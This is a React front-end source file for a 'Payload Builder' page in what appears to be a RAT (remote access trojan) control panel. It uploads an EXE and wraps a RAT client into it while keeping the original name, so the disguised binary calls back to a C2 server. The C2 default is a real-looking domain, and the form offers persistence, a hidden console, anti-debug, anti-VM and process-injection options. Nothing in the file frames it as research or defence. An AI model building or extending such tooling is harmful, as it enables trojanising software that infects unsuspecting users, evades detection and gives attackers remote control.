import React, { useState, useCallback } from 'react'
import { useStore } from '@/stores/useStore'
import { api } from '@/services/api'
import { GradientBackground } from '@/components/ui/GradientBackground'
import { GradientText } from '@/components/ui/GradientText'
import { Button } from '@/components/ui/Button'
import { Tabs, TabList, TabTrigger, TabContent } from '@/components/ui/Tabs'
import { FileText, Upload, Download, Loader2, AlertCircle, CheckCircle, X, Settings, Shield, Code2 } from 'lucide-react'
import clsx from 'clsx'

export function PayloadBuilderPage() {
  const [activeTab, setActiveTab] = useState<string>('builder')
  const [uploadedFile, setUploadedFile] = useState<File | null>(null)
  const [fileInfo, setFileInfo] = useState<{ name: string; size: number; type: string } | null>(null)
  const [config, setConfig] = useState({
    c2Host: 'thechoicervoicergames.com',
    c2Port: '8080',
    useTLS: false,
    key: '',
    hmacKey: '',
    sleepInterval: 60,
    jitter: 10,
    persistence: false,
    hideConsole: true,
    antiDebug: true,
    antiVM: true,
    injectionMethod: 'reflective' as 'reflective' | 'manual' | 'thread_hijack',
  })
  const [building, setBuilding] = useState(false)
  const [buildProgress, setBuildProgress] = useState(0)
  const [buildStatus, setBuildStatus] = useState('')
  const [buildResult, setBuildResult] = useState<{ id: string; filename: string; url: string } | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [history, setHistory] = useState<Array<{ id: string; filename: string; created_at: string; size: number; status: string }>>([])

  const { addNotification } = useStore()

  const handleFileUpload = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file) return

    if (!file.name.endsWith('.exe')) {
      setError('Only .exe files are supported')
      return
    }

    setUploadedFile(file)
    setFileInfo({
      name: file.name,
      size: file.size,
      type: file.type
    })
    setError(null)
  }, [])

  const removeFile = useCallback(() => {
    setUploadedFile(null)
    setFileInfo(null)
  }, [])

  const buildPayload = async () => {
    if (!uploadedFile) {
      setError('Please upload an EXE file first')
      return
    }

    if (!config.c2Host) {
      setError('C2 host is required')
      return
    }

    setBuilding(true)
    setBuildProgress(0)
    setBuildStatus('Wrapping binary + injecting C2 config...')
    setError(null)
    setBuildResult(null)

    try {
      const formData = new FormData()
      formData.append('binary', uploadedFile)
      formData.append('c2_host', config.c2Host)
      formData.append('c2_port', config.c2Port)
      formData.append('use_tls', config.useTLS.toString())
      formData.append('key', config.key)
      formData.append('hmac_key', config.hmacKey)
      formData.append('sleep_interval', config.sleepInterval.toString())
      formData.append('jitter', config.jitter.toString())
      formData.append('persistence', config.persistence.toString())
      formData.append('hide_console', config.hideConsole.toString())
      formData.append('anti_debug', config.antiDebug.toString())
      formData.append('anti_vm', config.antiVM.toString())
      formData.append('injection_method', config.injectionMethod)

      setBuildProgress(40)
      const result = await api.buildPayload(formData)

      setBuildProgress(100)
      setBuildStatus('Wrap complete — config embedded')
      setBuildResult(result)

      addNotification({
        type: 'success',
        message: `${fileInfo?.name} wrapped -> ${config.c2Host}`
      })

      loadHistory()
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Build failed')
      setBuildStatus('Build failed')
    } finally {
      setBuilding(false)
    }
  }

  const loadHistory = async () => {
    try {
      const res = await api.getPayloadHistory()
      setHistory(res || [])
    } catch {
      // Ignore
    }
  }

  const downloadPayload = async (id: string, filename: string) => {
    try {
      const response = await fetch(`/api/payloads/${id}/download`, {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('auth_token')}`
        }
      })
      if (!response.ok) throw new Error('Download failed')
      const blob = await response.blob()
      const url = window.URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      a.download = filename
      document.body.appendChild(a)
      a.click()
      window.URL.revokeObjectURL(url)
      document.body.removeChild(a)
    } catch (err) {
      addNotification({
        type: 'error',
        message: err instanceof Error ? err.message : 'Unknown error'
      })
    }
  }

  const deletePayload = async (id: string) => {
    try {
      await api.deletePayload(id)
      loadHistory()
      addNotification({
        type: 'success',
        message: 'Payload removed from history'
      })
    } catch (err) {
      addNotification({
        type: 'error',
        message: err instanceof Error ? err.message : 'Unknown error'
      })
    }
  }

  return (
    <div className="min-h-screen">
      <GradientBackground className="fixed inset-0 z-0" />
      <div className="relative z-10 p-6 max-w-5xl mx-auto">
        <div className="mb-8">
          <GradientText className="text-3xl font-bold mb-2">Payload Builder</GradientText>
          <p className="text-dark-400">
            Upload an EXE and wrap the RAT client into it, preserving the original filename and app name.
            The modified binary connects back to your C2 server with the configured settings.
          </p>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
          <TabList className="grid w-full grid-cols-2">
            <TabTrigger value="builder">
              <div className="flex items-center gap-2">
                <Code2 className="w-4 h-4" />
                Build Payload
              </div>
            </TabTrigger>
            <TabTrigger value="history">
              <div className="flex items-center gap-2">
                <FileText className="w-4 h-4" />
                History
              </div>
            </TabTrigger>
          </TabList>

          <TabContent value="builder" className="mt-6">
            {!uploadedFile ? (
              <div className="bg-dark-800/50 border border-dark-700 rounded-xl p-8 text-center">
                <input
                  type="file"
                  accept=".exe"
                  onChange={handleFileUpload}
                  id="exe-upload"
                  className="hidden"
                />
                <label htmlFor="exe-upload" className="cursor-pointer">
                  <Upload className="w-16 h-16 mx-auto text-dark-500 mb-4 opacity-50" />
                  <p className="text-dark-300 mb-2">Drag & drop or click to upload an EXE file</p>
                  <p className="text-dark-500 text-sm">Maximum size: 100MB</p>
                </label>
              </div>
            ) : (
              <div className="space-y-6">
                <div className="bg-dark-800/50 border border-dark-700 rounded-xl p-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <FileText className="w-10 h-10 text-accent-500 bg-accent-500/10 rounded-lg flex items-center justify-center" />
                      <div>
                        <p className="font-medium text-dark-100">{fileInfo?.name}</p>
                        <p className="text-dark-500 text-sm">
                          {fileInfo?.size ? `${(fileInfo.size / 1024 / 1024).toFixed(2)} MB` : 'Unknown size'}
                        </p>
                      </div>
                    </div>

                    <div className="text-dark-500 text-xs mt-2">
                      Maximum size: 300MB
                    </div>
                    <Button variant="ghost" size="sm" onClick={removeFile}>
                      <X className="w-4 h-4" />
                    </Button>
                  </div>
                </div>

                <div className="grid gap-6 md:grid-cols-2">
                  <div className="bg-dark-800/50 border border-dark-700 rounded-xl p-6">
                    <h3 className="font-semibold text-dark-100 mb-4 flex items-center gap-2">
                      <Shield className="w-5 h-5 text-accent-500" />
                      C2 Configuration
                    </h3>
                    <div className="space-y-4">
                      <div>
                        <label className="block text-sm text-dark-400 mb-1">C2 Host *</label>
                        <input
                          type="text"
                          value={config.c2Host}
                          onChange={(e) => setConfig({ ...config, c2Host: e.target.value })}
                          placeholder="c2.example.com or IP"
                          className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 placeholder-dark-500 focus:border-accent-500 focus:outline-none"
                        />
                      </div>
                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <label className="block text-sm text-dark-400 mb-1">Port</label>
                          <input
                            type="number"
                            value={config.c2Port}
                            onChange={(e) => setConfig({ ...config, c2Port: e.target.value })}
                            className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 focus:border-accent-500 focus:outline-none"
                          />
                        </div>
                        <div className="flex items-end">
                          <label className="flex items-center gap-2 cursor-pointer">
                            <input
                              type="checkbox"
                              checked={config.useTLS}
                              onChange={(e) => setConfig({ ...config, useTLS: e.target.checked })}
                              className="w-4 h-4 rounded border-dark-600 bg-dark-900 text-accent-500 focus:ring-accent-500"
                            />
                            <span className="text-sm text-dark-300">Use TLS/mTLS</span>
                          </label>
                        </div>
                      </div>
                      <div>
                        <label className="block text-sm text-dark-400 mb-1">Encryption Key (32 bytes hex)</label>
                        <input
                          type="text"
                          value={config.key}
                          onChange={(e) => setConfig({ ...config, key: e.target.value })}
                          placeholder="Auto-generated if empty"
                          className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 placeholder-dark-500 focus:border-accent-500 focus:outline-none font-mono text-sm"
                        />
                      </div>
                      <div>
                        <label className="block text-sm text-dark-400 mb-1">HMAC Key (32 bytes hex)</label>
                        <input
                          type="text"
                          value={config.hmacKey}
                          onChange={(e) => setConfig({ ...config, hmacKey: e.target.value })}
                          placeholder="Auto-generated if empty"
                          className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 placeholder-dark-500 focus:border-accent-500 focus:outline-none font-mono text-sm"
                        />
                      </div>
                    </div>
                  </div>

                  <div className="bg-dark-800/50 border border-dark-700 rounded-xl p-6">
                    <h3 className="font-semibold text-dark-100 mb-4 flex items-center gap-2">
                      <Settings className="w-5 h-5 text-accent-500" />
                      Behavioral Settings
                    </h3>
                    <div className="space-y-4">
                      <div className="grid grid-cols-2 gap-4">
                        <div>
                          <label className="block text-sm text-dark-400 mb-1">Sleep Interval (seconds)</label>
                          <input
                            type="number"
                            value={config.sleepInterval}
                            onChange={(e) => setConfig({ ...config, sleepInterval: parseInt(e.target.value) || 60 })}
                            min="1"
                            max="3600"
                            className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 focus:border-accent-500 focus:outline-none"
                          />
                        </div>
                        <div>
                          <label className="block text-sm text-dark-400 mb-1">Jitter (%)</label>
                          <input
                            type="number"
                            value={config.jitter}
                            onChange={(e) => setConfig({ ...config, jitter: parseInt(e.target.value) || 0 })}
                            min="0"
                            max="100"
                            className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 focus:border-accent-500 focus:outline-none"
                          />
                        </div>
                      </div>
                      <div className="grid grid-cols-2 gap-4">
                        <label className="flex items-center gap-2 cursor-pointer">
                          <input
                            type="checkbox"
                            checked={config.persistence}
                            onChange={(e) => setConfig({ ...config, persistence: e.target.checked })}
                            className="w-4 h-4 rounded border-dark-600 bg-dark-900 text-accent-500 focus:ring-accent-500"
                          />
                          <span className="text-sm text-dark-300">Enable Persistence</span>
                        </label>
                        <label className="flex items-center gap-2 cursor-pointer">
                          <input
                            type="checkbox"
                            checked={config.hideConsole}
                            onChange={(e) => setConfig({ ...config, hideConsole: e.target.checked })}
                            className="w-4 h-4 rounded border-dark-600 bg-dark-900 text-accent-500 focus:ring-accent-500"
                          />
                          <span className="text-sm text-dark-300">Hide Console Window</span>
                        </label>
                      </div>
                      <div className="grid grid-cols-2 gap-4">
                        <label className="flex items-center gap-2 cursor-pointer">
                          <input
                            type="checkbox"
                            checked={config.antiDebug}
                            onChange={(e) => setConfig({ ...config, antiDebug: e.target.checked })}
                            className="w-4 h-4 rounded border-dark-600 bg-dark-900 text-accent-500 focus:ring-accent-500"
                          />
                          <span className="text-sm text-dark-300">Anti-Debug</span>
                        </label>
                        <label className="flex items-center gap-2 cursor-pointer">
                          <input
                            type="checkbox"
                            checked={config.antiVM}
                            onChange={(e) => setConfig({ ...config, antiVM: e.target.checked })}
                            className="w-4 h-4 rounded border-dark-600 bg-dark-900 text-accent-500 focus:ring-accent-500"
                          />
                          <span className="text-sm text-dark-300">Anti-VM</span>
                        </label>
                      </div>
                      <div>
                        <label className="block text-sm text-dark-400 mb-1">Injection Method</label>
                        <select
                          value={config.injectionMethod}
                          onChange={(e) => setConfig({ ...config, injectionMethod: e.target.value as any })}
                          className="w-full bg-dark-900 border border-dark-700 rounded-lg px-3 py-2 text-dark-100 focus:border-accent-500 focus:outline-none"
                        >
                          <option value="reflective">Reflective DLL Injection</option>
                          <option value="manual">Manual Mapping</option>
                          <option value="thread_hijack">Thread Hijacking</option>
                        </select>
                      </div>
                    </div>
                  </div>
                </div>

                {error && (
                  <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-4 flex items-center gap-3 text-red-400">
                    <AlertCircle className="w-5 h-5 flex-shrink-0" />
                    <span>{error}</span>
                  </div>
                )}

                <Button
                  onClick={buildPayload}
                  disabled={building || !uploadedFile}
                  className="w-full py-3 text-lg"
                  size="lg"
                >
                  {building ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin mr-2" />
                      Building... {buildProgress}%
                    </>
                  ) : (
                    <>
                      <Code2 className="w-5 h-5 mr-2" />
                      Build Payload
                    </>
                  )}
                </Button>

                {building && (
                  <div className="space-y-2">
                    <div className="w-full bg-dark-900 rounded-full h-2 overflow-hidden">
                      <div
                        className="bg-accent-500 h-full rounded-full transition-all duration-300"
                        style={{ width: `${buildProgress}%` }}
                      />
                    </div>
                    <p className="text-dark-400 text-sm text-center">{buildStatus}</p>
                  </div>
                )}

                {buildResult && (
                  <div className="bg-green-500/10 border border-green-500/30 rounded-lg p-4">
                    <div className="flex items-center gap-3 mb-3">
                      <CheckCircle className="w-6 h-6 text-green-500 flex-shrink-0" />
                      <div>
                        <p className="font-medium text-green-400">Build Successful!</p>
                        <p className="text-dark-400 text-sm">Ready to download</p>
                      </div>
                    </div>
                    <Button
                      onClick={() => downloadPayload(buildResult.id, buildResult.filename)}
                      className="w-full"
                    >
                      <Download className="w-4 h-4 mr-2" />
                      Download {buildResult.filename}
                    </Button>
                  </div>
                )}
              </div>
            )}
          </TabContent>

          <TabContent value="history" className="mt-6">
            <div className="bg-dark-800/50 border border-dark-700 rounded-xl overflow-hidden">
              {history.length === 0 ? (
                <div className="p-12 text-center text-dark-500">
                  <FileText className="w-12 h-12 mx-auto mb-4 opacity-30" />
                  <p>No payloads built yet</p>
                </div>
              ) : (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead>
                      <tr className="border-b border-dark-700 bg-dark-900/50">
                        <th className="px-4 py-3 text-left text-sm font-medium text-dark-400">Filename</th>
                        <th className="px-4 py-3 text-left text-sm font-medium text-dark-400">Size</th>
                        <th className="px-4 py-3 text-left text-sm font-medium text-dark-400">Created</th>
                        <th className="px-4 py-3 text-left text-sm font-medium text-dark-400">Status</th>
                        <th className="px-4 py-3 text-right text-sm font-medium text-dark-400">Actions</th>
                      </tr>
                    </thead>
                    <tbody>
                      {history.map((item) => (
                        <tr key={item.id} className="border-b border-dark-700/50 hover:bg-dark-900/50">
                          <td className="px-4 py-3 font-mono text-sm text-dark-100">{item.filename}</td>
                          <td className="px-4 py-3 text-sm text-dark-400">
                            {(item.size / 1024 / 1024).toFixed(2)} MB
                          </td>
                          <td className="px-4 py-3 text-sm text-dark-400">
                            {new Date(item.created_at).toLocaleString()}
                          </td>
                          <td className="px-4 py-3">
                            <span className={clsx(
                              'px-2 py-1 rounded-full text-xs font-medium',
                              item.status === 'completed' && 'bg-green-500/20 text-green-400',
                              item.status === 'building' && 'bg-yellow-500/20 text-yellow-400',
                              item.status === 'failed' && 'bg-red-500/20 text-red-400'
                            )}>
                              {item.status}
                            </span>
                          </td>
                          <td className="px-4 py-3 text-right">
                            <div className="flex items-center justify-end gap-2">
                              {item.status === 'completed' && (
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => downloadPayload(item.id, item.filename)}
                                >
                                  <Download className="w-4 h-4" />
                                </Button>
                              )}
                              <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => deletePayload(item.id)}
                                className="text-red-400 hover:bg-red-500/10"
                              >
                                <X className="w-4 h-4" />
                              </Button>
                            </div>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              )}
            </div>
          </TabContent>
        </Tabs>
      </div>
    </div>
  )
}